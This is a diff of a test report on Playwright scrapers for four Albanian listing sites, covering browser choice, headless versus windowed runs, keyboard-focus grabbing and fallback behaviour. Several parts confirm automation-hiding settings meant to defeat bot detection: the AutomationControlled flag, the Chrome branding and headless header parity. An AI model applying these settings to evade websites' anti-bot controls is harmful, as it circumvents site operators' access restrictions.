-Tested on branch dev with the uncommitted browser changes (start_browser(), Use_Installed_Chrome,
-Window_Position/Window_Size, --disable-blink-features=AutomationControlled, the pyright ignore).
-Nothing in the repo was changed by this addendum and nothing was saved to the DB or Excel.
-Windows 11, Google Chrome 157.0.8103.51 installed, Playwright 1.64.1 with its Chromium 156.0.8078.4.
-
-HOW IT WAS TESTED
-- Live: one short turn of 2 new listings per site (known UPIDs from the DB skipped), in three setups:
-  installed Chrome windowed (off screen), Playwright Chromium windowed (off screen), installed Chrome headless.
-  12 turns in total, called through each scraper's own entry function.
-- Headers: each scraper's launch_browser() opened https://httpbin.org/headers (echoes the request headers).
-- Window: Chrome and Chromium, window on screen / off screen (-2000,-2000) / minimized; measured the window
-  state (CDP Browser.getWindowForTarget), document.visibilityState, requestAnimationFrame ticks, and which
-  window has keyboard focus (Win32 GetForegroundWindow) before and after each step a scraper does.
-- Fallback: "Chrome not installed" simulated. Process and temp-folder leaks checked after ~35 launches.
-- Static: pyflakes, compileall, importing every module, node --check app.js, the 31 checks from this
-  audit's #1-#3/B5 tests, the four error-handling blocks and launch helpers compared (identical).
-
-RESULTS
-- All 12 live turns ended "ok", 2 listings each, no crash, no block, no captcha, no fallback.
-                      Chrome window   Chromium window   Chrome headless
-    MerrJep             20.8 s           21.0 s            20.8 s
-    Gazeta Celesi       39.4 s *         16.8 s            17.4 s
-    Duashpi             20.9 s           19.9 s            19.9 s
-    Njoftime            16.1 s           15.6 s            16.3 s
-  * First turn after the process started: RESUME_PAGE lives in memory, so it walked pages 1-4 before
-    finding new listings (known, CLAUDE.md "State lives in memory"). Not browser related.
-- Data is the same in every setup: Gazeta and Njoftime returned the identical listings in all three;
-  every field was filled except one Gazeta listing (1882612) with no price and no photos in all three
-  setups (that is the listing's own data, not a browser difference).
-- Headers (all four scrapers, both modes):
-    navigator.webdriver   true before -> false now (AutomationControlled flag)
-    Sec-CH-UA             "Chromium";v="156" -> "Google Chrome";v="157", "Chromium";v="157" (Use_Installed_Chrome)
-    User-Agent            Chrome/157 Windows, identical headless and windowed; no "HeadlessChrome" anywhere
-- Fallback: with Chrome "missing" it printed the yellow warning and scraped with Chromium 156.
-- Leaks: 0 automated browser processes left after ~35 launches. 4 empty playwright* folders in %TEMP%,
-  all from earlier runs that were killed instead of closed (harmless, 0 MB).
-- Pylance "TypeVar not allowed" on isinstance(error, PlaywrightError): false positive (Playwright
-  exports Error as an alias; Python confirms it is a class). Silenced with a pyright ignore in all four
-  scrapers; the error-handling blocks are still byte-identical.
-
-FINDINGS
-W1  HIGH (windowed mode only): the scraper's window takes keyboard focus every time a browser starts
-    What:  With Headless = False, launching Chrome or Chromium makes it the active window, even when it is
-           off screen. Every site launches its own browser, so that is 4 focus grabs per turn, every few
-           minutes in continuous mode. Off screen makes it worse: the agent can't see the window that now
-           has focus, so what they type (an email, a search) goes into the hidden scraper window.
-    Evidence: foreground window before launch "HomeSweeper security aud... (VS Code)" -> after launch
-           "about:blank - Google Chrome" (same with Chromium, "Google Chrome for Testing").
-           Headless: focus never moved.
-    Only the launch does it: after focus was given back (Win32 SetForegroundWindow to the previous
-           window, returned 1), Ctrl+click into a new tab, tab.bring_to_front() and page.bring_to_front()
-           did NOT take it again (off-screen window).
-    Caveat: measured with the test started from VS Code (the foreground app). Windows limits which
-           processes may take focus, so the packaged tray app may behave differently; test it there.
-    Fix:   (a) Ship Headless = True, as CLAUDE.md -> Packaging already says. Headless now sends exactly the
-               same headers as the windowed browser (above), so a window buys nothing against detection.
-           (b) If a window must stay: right after launch_browser(), give focus back to the window that had
-               it (Windows: ctypes GetForegroundWindow before launch, SetForegroundWindow after). Tested to
-               work and to stay. Windows only; macOS would need its own code.
-W2  MEDIUM: a minimized scraper window always comes back
-    What:  Minimizing the window doesn't hide it. Opening a listing in a new tab (Ctrl+click) restores the
-           window, and so does bring_to_front(). MerrJep, Duashpi and Njoftime do both for every listing;
-           Gazeta never opens tabs, so it alone would stay minimized.
-    Evidence: minimized, then: mouse wheel / evaluate / wait / plain click -> stays minimized;
-           Ctrl+click new tab -> normal; page.bring_to_front() -> normal. Same in Chrome and Chromium.
-    Fix:   Don't use minimizing to hide the window. Use headless (W1 a) or the off-screen position.
-           Removing bring_to_front() would not be enough (the new tab alone restores the window).
-W3  MEDIUM: the off-screen position is only proven on Windows with one monitor
-    - macOS keeps windows (at least their title bar) on screen and is likely to pull a window at
-      -2000,-2000 back into view. Untested; check on a Mac before relying on it there.
-    - A second monitor to the left of or above the main one can sit at those coordinates
-      (config.py says to use bigger negatives there).
-    - The window still has a taskbar button; clicking it shows nothing useful to the agent.
-W4  LOW, before committing: config.py has Window_Position = None (window on screen, set on purpose to
-    watch the scraper). Whoever pulls it (Alex) gets visible scraper windows on screen. Set it back to
-    (-2000, -2000) when done watching, or decide W1 first.
-W5  LOW: Chrome fallback edge cases (untested here)
-    - A company-managed Chrome whose policy forbids remote debugging can't be driven, so every site would
-      fall back to Chromium every turn, printing the warning 4x per turn. Works, but noisy; once per run
-      would be enough.
-    - Chrome installed per user (%LOCALAPPDATA%) or on macOS (/Applications) was not tested here.
-    - Chrome updates itself (157 today vs Playwright's 156). Fine today; after a Playwright upgrade or a
-      big Chrome update, run one short turn.
-W6  INFO: visibility. A window that is off screen or minimized still reports document.visibilityState
-    "visible" with ~100 animation frames per 500 ms (Playwright starts Chrome with its background-
-    throttling switches off), so pages behave like a visible tab. No problem found.
-
-WHAT IS GOOD (verified)
-- Installed Chrome and Playwright Chromium scrape the same data at the same speed on all four sites.
-- The "automated" flag is gone and the brand is "Google Chrome" in every scraper and both modes.
-- Headless and windowed are indistinguishable in the headers.
-- The fallback to Chromium works; browsers close cleanly; the agent's own Chrome profile is never used.
-
-RECOMMENDATION
-1. Decide W1: headless (recommended, already the plan for the shipped app) or windowed + focus return.
-2. Until then keep Headless = False only for watching/debugging, and don't minimize the window.
-3. Set Window_Position back to (-2000, -2000) before committing (W4).
-4. Later: print the Chrome fallback warning once per run (W5); test the off-screen window on a Mac (W3).
-
-CONCLUSION (owner, 2026-11-12)
-- Headless (Headless = True) fixes W1, W2 and W3: no window means no focus grab, nothing to restore and
-  nothing to place off screen, and the headers are identical to the windowed browser. It is the way to run
-  the scrapers for real; the window is for watching and debugging only. Switching Chrome <-> Chromium does
-  NOT fix them (both behave the same).
-- Open question for W2: the owner saw a minimized window stay down while Chrome showed the "controlled by
-  automated test software" bar. This test minimized the window through CDP, not with the real minimize
-  button, and only a new listing tab restores it (Gazeta opens none; between listings nothing does).
-  Repeat with a real minimize and note which site was running before changing anything.
-- Left as is for now: Window_Position = None in config.py (W4) and the Chrome fallback warning (W5).
+1. N1 (first_int + a per-listing guard in with_derived) and N2 (map "Person fizik", empty Njoftime
+   = private). Both are a few lines.
+2. N3 data sanity (sale price floor, title says rent, MerrJep sandbox listing) + "Shitet në ankand".
+3. Small ones together: N6 lookbehinds, B10, B11, B16, searchable_text phone type, B6.
+4. Turn the scratchpad scripts into a pytest suite (checks.py, fuzz.py, race.py, bigint.py first).
+5. #4 slim list endpoint + ?since=, then N4 (update the cache in place) and N5 (?favourite=1).
+6. Before agents use it: Headless = True and Window_Position (W4), B12 date, B8 visible failures.
+7. Add the open N items to the Bug list in NOTES.md.
